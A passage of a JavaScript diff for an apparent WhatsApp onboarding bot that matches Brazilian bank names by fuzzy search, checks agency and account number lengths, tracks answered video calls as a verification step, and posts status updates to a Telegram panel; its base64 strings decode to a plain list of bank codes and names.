ZW50byBTLkEuIiwiMTI3IjoiQ29kZXBlIENvcnJldG9yYSBEZSBWYWxvcmVzIEUgQ8OibWJpbyBTLkEuIiwiMTI4IjoiTXMgQmFuayBTLkEuIEJhbmNvIERlIEPDom1iaW8iLCIxMjkiOiJVYnMgQnJhc2lsIEJhbmNvIGRlIEludmVzdGltZW50byBTLkEuIiwiMTMwIjoiQ2FydWFuYSBTLkEuIC0gU29jaWVkYGFkZSBEZSBDcsOpZGl0byIsIjEzMSI6IlR1bGxldHQgUHJlYm9uIEJyYXNpbCBDb3JyZXRvcmEgZGUgVmFsb3JlcyBlIEPDom1iaW8gTHRkYSIsIjEzMiI6IkljYmMgRG8gQnJhc2lsIEJhbmNvIE3Dumx0aXBsbyBTLkEuIiwiMTMzIjoiQmFuY28gQ3JlZ29sIC0gQ29uZmVkZXJhw6fDo28gTmFjaW9uYWwgRGFzIENvb3BlcmF0aXZhcyBDZW50cmFpcyBEZSBDcsOpZGl0byBlIEVjb25vbWlhIEZhbWlsaWFyIGUgU29saWTDoXJpYSIsIjEzNCI6IkJnYyBMaXF1aWRleiBEaXN0cmlidWlkb3JhIERlIFTDtXR1bG9zIEUgVmFsb3JlcyBNb2JpbGnDoXJpb3MgTHRkYSIsIjEzNiI6IlVuaWNyZWQgRG8gQnJhc2lsIC0gQ29uZmVkZXJhw6fDo28gTmFjaW9uYWwgRGFzIENvb3BlcmF0aXZhcyBDZW50cmFpcyBVbmljcmVkIEx0ZGEuIiwiMTM4IjoiR2V0IE1vbmV5IENvcnJldG9yYSBEZSBDw6JtYmlvIFMuQS4iLCIxMzkiOiJJbnRlc2EgU2FucGFvbG8gQnJhc2lsIFMuQS4gLSBCYW5jbyBNdWx0aXBsbyIsIjE0MCI6IkVhc3ludmVzdCAtIFTDrXR1bG8gQ29ycmV0b3JhIERlIFZhbG9yZXMgU2EiLCIxNDIiOiJCcm9rZXIgQnJhc2lsIENvcnJldG9yYSBEZSBDw6JtYmlvIEx0ZGEuIiwiMTQzIjoiVHJldmlzbyBDb3JyZXRvcmEgRGUgQ8OibWJpbyBTLkEuIiwiMTQ0IjoiQmV4cyBCYW5jbyBEZSBDw6JtYmlvIFMvQSIsIjE0NSI6IkxldnljYW0gLSBDb3JyZXRvcmEgRGUgQ2FtYmlvIEUgVmFsb3JlcyBMdGRhLiIsIjE0NiI6Ikd1aXR0YSBDb3JyZXRvcmEgRGUgQ2FtYmlvIEx0ZGEuIiwiMTQ5IjoiRmFjdGEgRmluYW5jZWlyYSBTLkEuIC0gQ3LDqWRpdG8gRmluYW5jaWFtZW50byBlIEludmVzdGltZW50byIsIjE1NyI6IkljYXAgRG8gQnJhc2lsIENvcnJldG9yYSBEZSBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9zIEx0ZGEuIiwiMTU5IjoiQ2FzYSBEbyBDcsOpZGl0byBTLkEuIFNvY2llZGFkZSBEZSBDcsOpZGl0byBBbyBNaWNyb2VtcHJlZW5kZWRvciIsIjE2MyI6IkNvbW1lcnpiYW5rIEJyYXNpbCBTLkEuIC0gQmFuY28gTcO6bHRpcGxvIiwiMTY5IjoiQmFuY28gT2zDqSBDb25zaWduYWRvIFMuQS4iLCIxNzMiOiJCcmwgVHJ1c3QgRGlzdHJpYnVpZG9yYSBEZSBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMuQS4iLCIxNzQiOiJQZWZpc2EgUy5BLiAtIENyw6lkaXRvIiwiMTc3IjoiR3VpZGUgSW52ZXN0aW1lbnRvcyBTLkEuIENvcnJldG9yYSBEZSBWYWxvcmVzIiwiMTgwIjoiQ20gQ2FwaXRhbCBNYXJrZXRzIENvcnJldG9yYSBEZSBDw6JtYmlvLCBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9zIEx0ZGEiLCIxODMiOiJTb2NyZWQgUy5BLiAtIFNvY2llZGFkZSBEZSBDcsOpZGl0byBBbyBNaWNyb2VtcHJlZW5kZWRvciBlIGEgRW1wcmVzYSBEZSBQZXF1ZW5vIFAiLCIxODQiOiJCYW5jbyBJdGHDuiBCQkEgUy5BLiIsIjE4OCI6IkF0aXZhIEludmVzdGltZW50b3MgUy5BLiBDb3JyZXRvcmEgRGUgVMOtdHVsb3MsIEPDom1iaW8gRSBWYWxvcmVzIiwiMTg5IjoiSFMgRmluYW5jZWlyYSBTL0EgQ3JlZGl0byIsIjE5MCI6IlNlcnZpY29vcCAtIENvb3BlcmF0aXZhIERlIENyw6lkaXRvIERvcyBTZXJ2aWRvcmVzIFDDumJsaWNvcyBFc3RhZHVhaXMgRG8gUmlvIEdyYW4iLCIxOTEiOiJOb3ZhIEZ1dHVyYSBDb3JyZXRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhLiIsIjE5NCI6IlBhcm1ldGFsIERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhIiwiMTk2IjoiRmFpciBDb3JyZXRvcmEgRGUgQ8OibWJpbyBTLkEuIiwiMTk3IjoiU3RvbmUgUGFnYW1lbnRvcyBTLkEuIiwiMjA4IjoiQmFuY28gQlRHIFBhY3R1YWwgUy5BLiIsIjIxMiI6IkJhbmNvIE9yaWdpbmFsIFMuQS4iLCIyMTMiOiJCYW5jbyBBcmJpIFMuQS4iLCIyMTciOiJCYW5jbyBKb2huIERlZXJlIFMuQS4iLCIyMTgiOiJCYW5jbyBCczIgUy5BLiIsIjIyMiI6IkJhbmNvIENyw6lkaXQgQWdyaWNvbGUgQnJhc2lsIFMuQS4iLCIyMjQiOiJCYW5jbyBGaWJyYSBTLkEuIiwiMjMzIjoiQmFuY28gQ2V0ZWxlbSBTLkEuIiwiMjM3IjoiQmFuY28gQnJhZGVzY28gUy5BLiIsIjI0MSI6IkJhbmNvIENsw6Fzc2ljbyBTLkEuIiwiMjQzIjoiQmFuY28gTcOheGltYSBTLkEuIiwiMjQ2IjoiQmFuY28gQWJjIEJyYXNpbCBTLkEuIiwiMjQ5IjoiQmFuY28gSW52ZXN0Y3JlZCBVbmliYW5jbyBTLkEuIiwiMjUwIjoiQmN2IC0gQmFuY28gZGUgQ3LDqWRpdG8gZSBWYXJlam8gUy5BLiIsIjI1MyI6IkJleHMgQ29ycmV0b3JhIERlIEPDom1iaW8gUy5BLiIsIjI1NCI6IlBhcmFuw6EgQmFuY28gUy5BLiIsIjI1OSI6Ik1vbmV5Y29ycCBCYW5jbyBkZSBtw61iaW8gUy5BLiIsIjI2MCI6Ik51IFBhZ2FtZW50b3MgUy5BLiIsIjI2NSI6IkJhbmNvIEZhdG9yIFMuQS4iLCIyNjYiOiJCYW5jbyBDZWR1bGEgUy5BLiIsIjI2OCI6IkJhcmkgQ29tcGFuaGlhIEhpcG90ZWPDoXJpYSIsIjI2OSI6IkJhbmNvIEhTQkMgUy5BLiIsIjI3MCI6IlNhZ2l0dXIgQ29ycmV0b3JhIERlIEPDom1iaW8gTHRkYS4iLCIyNzEiOiJJYiBDb3JyZXRvcmEgZGUgQ8OibWJpbywgdMOtdHVsbyBlIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMuQS4iLCIyNzIiOiJCYW5jbyBBZ2sgUy5BLiIsIjI3MyI6IkNvb3BlcmF0aXZhIGRlIENyw6lkaXRvIFUnIn0="));
+    const BANCOS_LIST = JSON.parse(_d("eyIxMDAiOiJQbGFubmVyIENvcnJldG9yYSBkZSBWYWxvcmVzIFMuQS4iLCIxMDEiOiJSZW5hc2NlbmNhIERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhIiwiMTAyIjoiWHAgSW52ZXN0aW1lbnRvcyBDb3JyZXRvcmEgZGUgQ8OibWJpbyxUw610dWxvcyBkIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMvQSIsIjEwNCI6IkNhaXhhIEVjb25vbWljYSBGZWRlcmFsIiwiMTA1IjoiTGVjY2EgQ3LDqWRpdG8iLCIxMDciOiJCYW5jbyBCb2NvbSBCYm0gUy5BLiIsIjEwOCI6IlBvcnRvY3JlZCBTLkEuIC0gQ3JlZGl0byIsIjExMSI6Ik9saXZlaXJhIFRydXN0IERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsaWFyaW9zIFMuQS4iLCIxMTMiOiJNYWdsaWFubyBTLkEuIENvcnJldG9yYSBEZSBDYW1iaW8gRSBWYWxvcmVzIE1vYmlsaWFyaW9zIiwiMTE0IjoiQ2VudHJhbCBDb29wZXJhdGl2YSBEZSBDcsOpZGl0byBObyBFc3RhZG8gRG8gRXNww61yaXRvIFNhbnRvIC0gQ2Vjb29wIiwiMTE3IjoiQWR2YW5jZWQgQ29ycmV0b3JhIERlIEPDom1iaW8gTHRkYSIsIjExOSI6IkJhbmNvIFdlc3Rlcm4gVW5pb24gRG8gQnJhc2lsIFMuQS4iLCIxMjAiOiJCYW5jbyBSb2RvYmVucyBTLkEuIiwiMTIxIjoiQmFuY28gQWdpYmFuayBTLkEuIiwiMTIyIjoiQmFuY28gQnJhZGVzY28gQmVyaiBTLkEuIiwiMTI0IjoiQmFuY28gV29vcmkgQmFuayBEbyBCcmFzaWwgUy5BLiIsIjEyNSI6IlBsdXJhbCBTLkEuIEJhbmNvIE3Dumx0aXBsbyIsIjEyNiI6IkJyIFBhcnRuZXJzIEJhbmNvIERlIEludmVzdGltZW50byBTLkEuIiwiMTI3IjoiQ29kZXBlIENvcnJldG9yYSBEZSBWYWxvcmVzIEUgQ8OibWJpbyBTLkEuIiwiMTI4IjoiTXMgQmFuayBTLkEuIEJhbmNvIERlIEPDom1iaW8iLCIxMjkiOiJVYnMgQnJhc2lsIEJhbmNvIGRlIEludmVzdGltZW50byBTLkEuIiwiMTMwIjoiQ2FydWFuYSBTLkEuIC0gU29jaWVkYGFkZSBEZSBDcsOpZGl0byIsIjEzMSI6IlR1bGxldHQgUHJlYm9uIEJyYXNpbCBDb3JyZXRvcmEgZGUgVmFsb3JlcyBlIEPDom1iaW8gTHRkYSIsIjEzMiI6IkljYmMgRG8gQnJhc2lsIEJhbmNvIE3Dumx0aXBsbyBTLkEuIiwiMTMzIjoiQmFuY28gQ3JlZ29sIC0gQ29uZmVkZXJhw6fDo28gTmFjaW9uYWwgRGFzIENvb3BlcmF0aXZhcyBDZW50cmFpcyBEZSBDcsOpZGl0byBlIEVjb25vbWlhIEZhbWlsaWFyIGUgU29saWTDoXJpYSIsIjEzNCI6IkJnYyBMaXF1aWRleiBEaXN0cmlidWlkb3JhIERlIFTDtXR1bG9zIEUgVmFsb3JlcyBNb2JpbGnDoXJpb3MgTHRkYSIsIjEzNiI6IlVuaWNyZWQgRG8gQnJhc2lsIC0gQ29uZmVkZXJhw6fDo28gTmFjaW9uYWwgRGFzIENvb3BlcmF0aXZhcyBDZW50cmFpcyBVbmljcmVkIEx0ZGEuIiwiMTM4IjoiR2V0IE1vbmV5IENvcnJldG9yYSBEZSBDw6JtYmlvIFMuQS4iLCIxMzkiOiJJbnRlc2EgU2FucGFvbG8gQnJhc2lsIFMuQS4gLSBCYW5jbyBNdWx0aXBsbyIsIjE0MCI6IkVhc3ludmVzdCAtIFTDrXR1bG8gQ29ycmV0b3JhIERlIFZhbG9yZXMgU2EiLCIxNDIiOiJCcm9rZXIgQnJhc2lsIENvcnJldG9yYSBEZSBDw6JtYmlvIEx0ZGEuIiwiMTQzIjoiVHJldmlzbyBDb3JyZXRvcmEgRGUgQ8OibWJpbyBTLkEuIiwiMTQ0IjoiQmV4cyBCYW5jbyBEZSBDw6JtYmlvIFMvQSIsIjE0NSI6IkxldnljYW0gLSBDb3JyZXRvcmEgRGUgQ2FtYmlvIEUgVmFsb3JlcyBMdGRhLiIsIjE0NiI6Ikd1aXR0YSBDb3JyZXRvcmEgRGUgQ2FtYmlvIEx0ZGEuIiwiMTQ5IjoiRmFjdGEgRmluYW5jZWlyYSBTLkEuIC0gQ3LDqWRpdG8gRmluYW5jaWFtZW50byBlIEludmVzdGltZW50byIsIjE1NyI6IkljYXAgRG8gQnJhc2lsIENvcnJldG9yYSBEZSBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9zIEx0ZGEuIiwiMTU5IjoiQ2FzYSBEbyBDcsOpZGl0byBTLkEuIFNvY2llZGFkZSBEZSBDcsOpZGl0byBBbyBNaWNyb2VtcHJlZW5kZWRvciIsIjE2MyI6IkNvbW1lcnpiYW5rIEJyYXNpbCBTLkEuIC0gQmFuY28gTcO6bHRpcGxvIiwiMTY5IjoiQmFuY28gT2zDqSBDb25zaWduYWRvIFMuQS4iLCIxNzMiOiJCcmwgVHJ1c3QgRGlzdHJpYnVpZG9yYSBEZSBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMuQS4iLCIxNzQiOiJQZWZpc2EgUy5BLiAtIENyw6lkaXRvIiwiMTc3IjoiR3VpZGUgSW52ZXN0aW1lbnRvcyBTLkEuIENvcnJldG9yYSBEZSBWYWxvcmVzIiwiMTgwIjoiQ20gQ2FwaXRhbCBNYXJrZXRzIENvcnJldG9yYSBEZSBDw6JtYmlvLCBUw610dWxvcyBFIFZhbG9yZXMgTW9iaWxpw6FyaW9zIEx0ZGEiLCIxODMiOiJTb2NyZWQgUy5BLiAtIFNvY2llZGFkZSBEZSBDcsOpZGl0byBBbyBNaWNyb2VtcHJlZW5kZWRvciBlIGEgRW1wcmVzYSBEZSBQZXF1ZW5vIFAiLCIxODQiOiJCYW5jbyBJdGHDuiBCQkEgUy5BLiIsIjE4OCI6IkF0aXZhIEludmVzdGltZW50b3MgUy5BLiBDb3JyZXRvcmEgRGUgVMOtdHVsb3MsIEPDom1iaW8gRSBWYWxvcmVzIiwiMTg5IjoiSFMgRmluYW5jZWlyYSBTL0EgQ3JlZGl0byIsIjE5MCI6IlNlcnZpY29vcCAtIENvb3BlcmF0aXZhIERlIENyw6lkaXRvIERvcyBTZXJ2aWRvcmVzIFDDumJsaWNvcyBFc3RhZHVhaXMgRG8gUmlvIEdyYW4iLCIxOTEiOiJOb3ZhIEZ1dHVyYSBDb3JyZXRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhLiIsIjE5NCI6IlBhcm1ldGFsIERpc3RyaWJ1aWRvcmEgZGUgVMOtdHVsb3MgZSBWYWxvcmVzIE1vYmlsacOhcmlvcyBMdGRhIiwiMTk2IjoiRmFpciBDb3JyZXRvcmEgRGUgQ8OibWJpbyBTLkEuIiwiMTk3IjoiU3RvbmUgUGFnYW1lbnRvcyBTLkEuIiwiMjA4IjoiQmFuY28gQlRHIFBhY3R1YWwgUy5BLiIsIjIxMiI6IkJhbmNvIE9yaWdpbmFsIFMuQS4iLCIyMTMiOiJCYW5jbyBBcmJpIFMuQS4iLCIyMTciOiJCYW5jbyBKb2huIERlZXJlIFMuQS4iLCIyMTgiOiJCYW5jbyBCczIgUy5BLiIsIjIyMiI6IkJhbmNvIENyw6lkaXQgQWdyaWNvbGUgQnJhc2lsIFMuQS4iLCIyMjQiOiJCYW5jbyBGaWJyYSBTLkEuIiwiMjMzIjoiQmFuY28gQ2V0ZWxlbSBTLkEuIiwiMjM3IjoiQmFuY28gQnJhZGVzY28gUy5BLiIsIjI0MSI6IkJhbmNvIENsw6Fzc2ljbyBTLkEuIiwiMjQzIjoiQmFuY28gTcOheGltYSBTLkEuIiwiMjQ2IjoiQmFuY28gQWJjIEJyYXNpbCBTLkEuIiwiMjQ5IjoiQmFuY28gSW52ZXN0Y3JlZCBVbmliYW5jbyBTLkEuIiwiMjUwIjoiQmN2IC0gQmFuY28gZGUgQ3LDqWRpdG8gZSBWYXJlam8gUy5BLiIsIjI1MyI6IkJleHMgQ29ycmV0b3JhIERlIEPDom1iaW8gUy5BLiIsIjI1NCI6IlBhcmFuw6EgQmFuY28gUy5BLiIsIjI1OSI6Ik1vbmV5Y29ycCBCYW5jbyBkZSBtw61iaW8gUy5BLiIsIjI2MCI6Ik51IFBhZ2FtZW50b3MgUy5BLiIsIjI2NSI6IkJhbmNvIEZhdG9yIFMuQS4iLCIyNjYiOiJCYW5jbyBDZWR1bGEgUy5BLiIsIjI2OCI6IkJhcmkgQ29tcGFuaGlhIEhpcG90ZWPDoXJpYSIsIjI2OSI6IkJhbmNvIEhTQkMgUy5BLiIsIjI3MCI6IlNhZ2l0dXIgQ29ycmV0b3JhIERlIEPDom1iaW8gTHRkYS4iLCIyNzEiOiJJYiBDb3JyZXRvcmEgZGUgQ8OibWJpbywgdMOtdHVsbyBlIFZhbG9yZXMgTW9iaWxpw6FyaW9zIFMuQS4iLCIyNzIiOiJCYW5jbyBBZ2sgUy5BLiIsIjI3MyI6IkNvb3BlcmF0aXZhIGRlIENyw6lkaXRvIFUnIn0="));
 
-function similarity(s1, s2) {
-    let longer = s1.toLowerCase();
-    let shorter = s2.toLowerCase();
-    if (s1.length < s2.length) {
-        longer = s2;
-        shorter = s1;
+    function similarity(s1, s2) {
+        let longer = s1.toLowerCase();
+        let shorter = s2.toLowerCase();
+        if (s1.length < s2.length) {
+            longer = s2;
+            shorter = s1;
+        }
+        const longerLength = longer.length;
+        if (longerLength === 0) return 1.0;
+        return (longerLength - editDistance(longer, shorter)) / parseFloat(longerLength);
     }
-    const longerLength = longer.length;
-    if (longerLength === 0) return 1.0;
-    return (longerLength - editDistance(longer, shorter)) / parseFloat(longerLength);
-}
 
-function editDistance(s1, s2) {
-    s1 = s1.toLowerCase();
-    s2 = s2.toLowerCase();
-    const costs = [];
-    for (let i = 0; i <= s1.length; i++) {
-        let lastValue = i;
-        for (let j = 0; j <= s2.length; j++) {
-            if (i === 0) costs[j] = j;
-            else {
-                if (j > 0) {
-                    let newValue = costs[j - 1];
-                    if (s1.charAt(i - 1) !== s2.charAt(j - 1)) {
-                        newValue = Math.min(Math.min(newValue, lastValue), costs[j]) + 1;
+    function editDistance(s1, s2) {
+        s1 = s1.toLowerCase();
+        s2 = s2.toLowerCase();
+        const costs = [];
+        for (let i = 0; i <= s1.length; i++) {
+            let lastValue = i;
+            for (let j = 0; j <= s2.length; j++) {
+                if (i === 0) costs[j] = j;
+                else {
+                    if (j > 0) {
+                        let newValue = costs[j - 1];
+                        if (s1.charAt(i - 1) !== s2.charAt(j - 1)) {
+                            newValue = Math.min(Math.min(newValue, lastValue), costs[j]) + 1;
+                        }
+                        costs[j - 1] = lastValue;
+                        lastValue = newValue;
                     }
-                    costs[j - 1] = lastValue;
-                    lastValue = newValue;
                 }
             }
+            if (i > 0) costs[s2.length] = lastValue;
         }
-        if (i > 0) costs[s2.length] = lastValue;
+        return costs[s2.length];
     }
-    return costs[s2.length];
-}
 
-function detectBank(text) {
-    if (!text) return null;
+    function detectBank(text) {
+        if (!text) return null;
 
-    // Normalização agressiva
-    const clean = text.toLowerCase()
-        .normalize("NFD").replace(/[\u0300-\u036f]/g, "") // Remove acentos
-        .replace(/[^a-z0-9 ]/g, " ") // Remove caracteres especiais
-        .replace(/\s+/g, " ") // Remove espaços duplos
-        .trim();
+        // Normalização agressiva
+        const clean = text.toLowerCase()
+            .normalize("NFD").replace(/[\u0300-\u036f]/g, "") // Remove acentos
+            .replace(/[^a-z0-9 ]/g, " ") // Remove caracteres especiais
+            .replace(/\s+/g, " ") // Remove espaços duplos
+            .trim();
 
-    // Palavras que indicam que o usuário está falando de agência (com variações de erro)
-    const agenciaVariations = ["agencia", "agencia", "agensia", "agenca", "agensea", "ag", "agen"];
+        // Palavras que indicam que o usuário está falando de agência (com variações de erro)
+        const agenciaVariations = ["agencia", "agencia", "agensia", "agenca", "agensea", "ag", "agen"];
 
-    // Remove as variações de "agência" para tentar isolar o nome do banco
-    let textFocus = clean;
-    agenciaVariations.forEach(v => {
-        const regex = new RegExp(`\\b${v}\\b`, 'gi');
-        textFocus = textFocus.replace(regex, "");
+        // Remove as variações de "agência" para tentar isolar o nome do banco
+        let textFocus = clean;
+        agenciaVariations.forEach(v => {
+            const regex = new RegExp(`\\b${v}\\b`, 'gi');
+            textFocus = textFocus.replace(regex, "");
+        });
+        textFocus = textFocus.trim();
+
+        const commonPatterns = [
+            { code: "237", name: "Banco Bradesco S.A.", keywords: ["bradesco", "brad", "bradesko", "bradescc", "bradezco"] },
+            { code: "341", name: "Itaú Unibanco S.A.", keywords: ["itau", "itauu", "itauunibanco", "itauu"] },
+            { code: "001", name: "Banco do Brasil S.A.", keywords: ["banco do brasil", "bb", "banco brasil", "brasil", "brasi"] },
+            { code: "104", name: "Caixa Economica Federal", keywords: ["caixa", "cef", "caixa economica", "caixa federal", "caixa"] },
+            { code: "033", name: "Banco Santander (Brasil) S.A.", keywords: ["santander", "santande", "santandere", "santader"] },
+            { code: "260", name: "Nu Pagamentos S.A. (Nubank)", keywords: ["nubank", "nu bank", "nu pagamentos", "nu", "nobank", "nubanc"] },
+            { code: "077", name: "Banco Inter S.A.", keywords: ["inter", "banco inter", "intermedium"] },
+            { code: "336", name: "Banco C6 S.A.", keywords: ["c6", "c6 bank", "c6bank", "ceis"] },
+            { code: "290", name: "Pagseguro Internet S.A. (PagBank)", keywords: ["pagbank", "pagseguro", "pag bank", "pag", "pag seguro"] },
+            { code: "323", name: "Mercadopago.Com Representacoes Ltda.", keywords: ["mercado pago", "mercado livre", "mercadopago", "mp", "mercadopago"] },
+            { code: "041", name: "Banrisul", keywords: ["banrisul", "banrisu", "banco do estado do rio grande do sul"] },
+            { code: "623", name: "Banco Pan S.A.", keywords: ["pan", "banco pan", "bancopan"] },
+            { code: "756", name: "Sicoob", keywords: ["sicoob", "sicob", "sicoobi"] },
+            { code: "748", name: "Sicredi", keywords: ["sicredi", "sicred", "sicredy"] },
+            { code: "380", name: "Picpay Servicos S.A.", keywords: ["picpay", "pic pay", "pikpay"] }
+        ];
+
+        // 1. Busca por keywords exatas/contidas
+        for (const bank of commonPatterns) {
+            if (bank.keywords.some(k => textFocus.includes(k) || clean.includes(k))) {
+                return { code: bank.code, name: bank.name };
+            }
+        }
+
+        // 2. Busca na lista completa (BANCOS_LIST)
+        for (const [code, name] of Object.entries(BANCOS_LIST)) {
+            const cleanBankName = name.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
+            if (clean.includes(code) || clean.includes(cleanBankName) || textFocus.includes(cleanBankName)) {
+                return { code, name };
+            }
+        }
+
+        // 3. Inteligência Artificial de fallback (Fuzzy match manual)
+        let bestMatch = null;
+        let highestScore = 0;
+
+        const searchPool = [
+            ...commonPatterns.map(b => ({ code: b.code, name: b.name, search: b.keywords[0] })),
+            ...Object.entries(BANCOS_LIST).map(([code, name]) => ({
+                code,
+                name,
+                search: name.toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "").replace(/[^a-z0-9 ]/g, " ").trim()
+            }))
+        ];
+
+        for (const item of searchPool) {
+            const score = similarity(textFocus, item.search);
+            if (score > highestScore) {
+                highestScore = score;
+                bestMatch = item;
+            }
+        }
+
+        // Se a similaridade for alta o suficiente (acima de 75%)
+        if (highestScore > 0.75) {
+            return { code: bestMatch.code, name: bestMatch.name };
+        }
+
+        return null;
+    }
+    function validateBankData(bankCode, ag, cc) {
+        const cleanAg = ag.replace(/\D/g, "");
+        const cleanCc = cc.replace(/\D/g, "");
+
+        // Regras específicas para os maiores bancos (Overrides)
+        const specificRules = {
+            "001": { agLen: 4, ccMin: 5, ccMax: 9 },  // BB
+            "237": { agLen: 4, ccMin: 5, ccMax: 7 },  // Bradesco
+            "341": { agLen: 4, ccMin: 5, ccMax: 5 },  // Itaú
+            "104": { agLen: 4, ccMin: 11, ccMax: 13 }, // Caixa (com operação)
+            "033": { agLen: 4, ccMin: 8, ccMax: 8 },  // Santander
+            "260": { agLen: 4, ccMin: 4, ccMax: 10 }, // Nubank
+            "077": { agLen: 4, ccMin: 4, ccMax: 10 }, // Inter
+            "336": { agLen: 4, ccMin: 4, ccMax: 10 }  // C6 Bank
+        };
+
+        const bankName = BANCOS_LIST[bankCode] || "Instituição";
+        const rule = specificRules[bankCode] || { agLen: 4, ccMin: 4, ccMax: 15 }; // Regra padrão para todos os bancos da lista
+
+        if (cleanAg.length !== rule.agLen) {
+            return { valid: false, error: `A agência do ${bankName} deve conter exatamente ${rule.agLen} dígitos.` };
+        }
+        if (cleanCc.length < rule.ccMin || cleanCc.length > rule.ccMax) {
+            return { valid: false, error: `A conta informada para o ${bankName} parece ser inválida ou está fora do padrão (mínimo ${rule.ccMin} dígitos).` };
+        }
+
+        return { valid: true };
+    }
+
+
+    client.on('message_create', async (msg) => {
+        if (BOT_ID !== 'main') return;
+        if (!msg.fromMe) return;
+
+        const targetChatId = msg.to;
+        if (!targetChatId) return;
+        if (targetChatId.includes('@g.us')) return;
+
+        const currentSession = chatSessions.get(targetChatId);
+
+        // --- DETECÇÃO DE LIGAÇÃO ATENDIDA / DESLIGADA ---
+        if (msg.type === 'call_log') {
+            const callBody = (msg.body || '').toLowerCase();
+
+            // Verifica se é uma chamada de VÍDEO
+            const isVideoCall = callBody.includes('vídeo') || callBody.includes('video') || msg.isVideo === true;
+
+            // Verifica se a ligação foi atendida (não perdida/recusada/rejeitada)
+            // Se a duração aparecer no corpo, é um forte sinal de que foi atendida
+            const hasDuration = /\d+ (min|seg|sec)/.test(callBody);
+            const isMissed = callBody.includes('perdida') || callBody.includes('missed') || callBody.includes('sem resposta') || callBody.includes('rejeitada') || callBody.includes('recusada') || callBody.includes('cancelada');
+
+            const callAnswered = !isMissed && (hasDuration || callBody.length > 5);
+
+            if (currentSession) {
+                currentSession.isCalling = false;
+
+                // REGRA: Só libera Etapa 2 se for Chamada de VÍDEO e for ATENDIDA
+                if (isVideoCall && callAnswered) {
+                    // Ligação de vídeo atendida e encerrada → Etapa 2 CONCLUÍDA
+                    currentSession.humanStep = 2;
+                    console.log(`✅ [CALL] Vídeo chamada atendida por ${targetChatId} — Etapa 2 CONCLUÍDA.`);
+                } else if (callAnswered && !isVideoCall) {
+                    console.log(`ℹ️ [CALL] Chamada de VOZ atendida por ${targetChatId} — Ignorado (exige Vídeo).`);
+                } else {
+                    // Ligação perdida/não atendida/rejeitada → Etapa 2 PENDENTE
+                    currentSession.humanStep = 1;
+                    console.log(`📵 [CALL] Chamada NÃO atendida por ${targetChatId} — Etapa 2 volta para PENDENTE.`);
+                }
+
+                chatSessions.set(targetChatId, currentSession);
+                saveSessions();
+
+                // 1. ATUALIZA PAINEL NO TELEGRAM
+                if (currentSession.tgMsgId) {
+                    const { text: txt, reply_markup } = buildCadastroMessage(
+                        targetChatId,
+                        currentSession.name,
+                        currentSession.birthDate,
+                        'human',
+                        currentSession.docType,
+                        currentSession.humanStep,
+                        false
+                    );
+                    await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
+                }
+
+                // 2. ATUALIZA MENSAGEM NO WHATSAPP (EDITA)
+                setTimeout(async () => {
+                    try {
+                        if (currentSession.assumeMsgId) {
+                            const msg = await client.getMessageById(currentSession.assumeMsgId);
+                            await msg.edit(buildStatusMessage(currentSession.humanStep));
+                        } else {
+                            // Se não achar a mensagem para editar, manda uma nova com o status atual
+                            await sendBotMessage(targetChatId, buildStatusMessage(currentSession.humanStep));
+                        }
+                    } catch (e) {
+                        console.error("Erro ao atualizar status após call:", e.message);
+                    }
+                }, 1500);
+            }
+            return;
+        }
+
+        if (!currentSession || (currentSession.mode !== 'bot' && currentSession.mode !== 'waiting') || internalMessageChats.has(targetChatId)) return;
+
+        const updatedSession = {
+            ...currentSession,
+            mode: 'human',
+            humanStep: 1,
+            name: currentSession.name || null,
+            birthDate: currentSession.birthDate || null,
+            docType: currentSession.docType || 'CPF'
+        };
+
+        chatSessions.set(targetChatId, updatedSession);
+        saveSessions();
+
+        const { text: txtAssume, reply_markup: rmAssume } = buildCadastroMessage(targetChatId, updatedSession.name, updatedSession.birthDate, 'human', updatedSession.docType, 1);
+        await notifyTelegram(txtAssume, updatedSession.tgMsgId, rmAssume);
+
+        setTimeout(async () => {
+            try {
+                const sentMsg = await sendBotMessage(targetChatId, buildStatusMessage(1));
+                if (sentMsg && sentMsg.id) {
+                    updatedSession.assumeMsgId = sentMsg.id._serialized;
+                    chatSessions.set(targetChatId, updatedSession);
+                    saveSessions();
+                }
+                console.log(`📨 [ADMIN] Mensagem formal enviada ao lead: ${targetChatId}`);
+            } catch (e) {
+                console.error(`❌ [ADMIN] Erro ao enviar mensagem formal:`, e.message);
+            }
+        }, 1000);
     });
-    textFocus = textFocus.trim();
 
-    const commonPatterns = [
-        { code: "237", name: "Banco Bradesco S.A.", keywords: ["bradesco", "brad", "bradesko", "bradescc", "bradezco"] },
-        { code: "341", name: "Itaú Unibanco S.A.", keywords: ["itau", "itauu", "itauunibanco", "itauu"] },
-        { code: "001", name: "Banco do Brasil S.A.", keywords: ["banco do brasil", "bb", "banco brasil", "brasil", "brasi"] },
-        { code: "104", name: "Caixa Economica Federal", keywords: ["caixa", "cef", "caixa economica", "caixa federal", "caixa"] },
-        { code: "033", name: "Banco Santander (Brasil) S.A.", keywords: ["santander", "santande", "santandere", "santader"] },
-        { code: "260", name: "Nu Pagamentos S.A. (Nubank)", keywords: ["nubank", "nu bank", "nu pagamentos", "nu", "nobank", "nubanc"] },
-        { code: "077", name: "Banco Inter S.A.", keywords: ["inter", "banco inter", "intermedium"] },
-        { code: "336", name: "Banco C6 S.A.", keywords: ["c6", "c6 bank", "c6bank", "ceis"] },
